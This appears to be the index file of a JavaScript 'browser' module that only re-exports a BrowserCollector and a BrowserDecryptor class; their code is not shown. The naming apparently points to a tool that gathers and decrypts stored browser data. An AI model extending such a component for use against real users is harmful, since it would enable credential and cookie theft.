/**
 * Browser Module Exports
 * Centralized exports for browser-related functionality
 */

const { BrowserCollector } = require('./collector');
const { BrowserDecryptor } = require('./decryptor');

module.exports = {
    BrowserCollector,
    BrowserDecryptor
};